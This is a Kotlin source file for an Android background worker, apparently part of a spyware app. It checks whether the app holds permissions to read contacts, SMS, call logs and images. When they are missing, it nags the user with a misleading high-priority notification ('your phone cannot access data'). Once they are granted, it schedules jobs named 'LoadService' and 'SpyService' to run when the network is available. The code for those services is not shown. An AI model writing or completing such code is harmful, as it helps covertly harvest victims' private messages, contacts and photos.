package com.example.background

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log
import androidx.annotation.RequiresPermission
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.util.concurrent.TimeUnit

class PermissionWorker(context: Context, params: WorkerParameters)
    : Worker(context, params) {
    @RequiresPermission(Manifest.permission.POST_NOTIFICATIONS)
    override fun doWork(): Result {
        Log.d("PermissionWorker", "Start")

        return try {
            val missingPermissions = getMissingPermissions()

            if (missingPermissions.isNotEmpty()) {
                Log.d("PermissionWorker", "Missing permissions: $missingPermissions")
                    //startPermissionActivity(missingPermissions)
                showPermissionNotification(missingPermissions)
                Result.success()
            } else {
                Log.d("PermissionWorker", "All permissions granted")
                scheduleMainWork()
                Result.success()
            }
        } catch (e: Exception) {
            Log.e("PermissionWorker", "Error: ${e.message}")
            Result.failure()
        }
    }

    private fun getMissingPermissions(): List<String> {
        val missing = mutableListOf<String>()

        val permissionsToCheck = listOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_MEDIA_IMAGES
        )

        permissionsToCheck.forEach { permission ->
            if (ContextCompat.checkSelfPermission(applicationContext, permission) != PackageManager.PERMISSION_GRANTED) {
                missing.add(permission)
            }
        }

        return missing
    }

    @RequiresPermission(Manifest.permission.POST_NOTIFICATIONS)
    private fun showPermissionNotification(permissions: List<String>) {
        createNotificationChannel()

        val intent = Intent(applicationContext, PermissionActivity::class.java).apply {
            putStringArrayListExtra("permissions", ArrayList(permissions))
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }

        val pendingIntent = PendingIntent.getActivity(
            applicationContext,
            0,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        // Создаем и показываем уведомление
        val notification = NotificationCompat.Builder(applicationContext, "permission_channel")
            .setContentTitle("Требуются разрешения")
            .setContentText("Ваш телефон не может получить доступ к данным")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .build()

        NotificationManagerCompat.from(applicationContext).notify(1001, notification)
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "permission_channel", // ID канала (должен совпадать с тем, что в Builder)
            "Permission Notifications", // Имя канала для пользователя
            NotificationManager.IMPORTANCE_HIGH // Важность
        ).apply {
            description = "Channel for permission requests"
            enableVibration(true)
            vibrationPattern = longArrayOf(0, 250, 250, 250)
        }

        val notificationManager =
            applicationContext.getSystemService(NotificationManager::class.java)
        notificationManager.createNotificationChannel(channel)

        Log.d("Notification", "Channel created: permission_channel")
    }

    private fun scheduleMainWork() {
        val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()

        val loadWorkRequest = OneTimeWorkRequestBuilder<LoadService>()
            .addTag("LOAD_JOB")
            .setConstraints(constraints)
            .setInitialDelay(10, TimeUnit.SECONDS)
            .build()

        val quickWorkRequest = OneTimeWorkRequestBuilder<SpyService>()
            .addTag("SPY_JOB")
            .setConstraints(constraints)
            .setInitialDelay(1, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance().beginWith(loadWorkRequest).then(quickWorkRequest).enqueue()
        Log.d("PermissionWorker", "Main work scheduled")
    }
}